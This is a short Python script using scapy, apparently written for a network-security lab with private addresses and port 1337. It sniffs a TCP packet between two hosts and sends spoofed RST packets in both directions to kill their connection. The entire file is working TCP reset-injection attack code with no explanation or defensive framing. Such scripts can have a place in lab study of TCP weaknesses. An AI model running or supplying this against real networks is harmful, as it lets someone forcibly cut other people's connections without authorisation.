from scapy.all import *
from sys import argv


def main():
    if len(argv) != 4:
        print("Usage: python3 tcp_reset.py <src_ip> <dst_ip> <dst_port>")
        exit(1)

    src_ip = argv[1]        # 192.168.124.20 (host2)
    dst_ip = argv[2]        # 192.168.124.10 (host1)
    dst_port = int(argv[3])  # 1337

    pkt = sniff(
        filter=f"tcp and host {src_ip} and host {dst_ip} and port {dst_port}", count=1, timeout=5)[0]

    s_ip, d_ip = pkt[IP].src, pkt[IP].dst
    s_port, d_port = pkt[TCP].sport, pkt[TCP].dport
    seq, ack = pkt[TCP].seq, pkt[TCP].ack

    # Reset from source to dest
    send(IP(src=s_ip, dst=d_ip)/TCP(sport=s_port,
         dport=d_port, flags="R", seq=seq), verbose=False)

    # Reset from dest to source
    send(IP(src=d_ip, dst=s_ip)/TCP(sport=d_port,
         dport=s_port, flags="R", seq=ack), verbose=False)

    print("Resets sent")


if __name__ == "__main__":
    main()
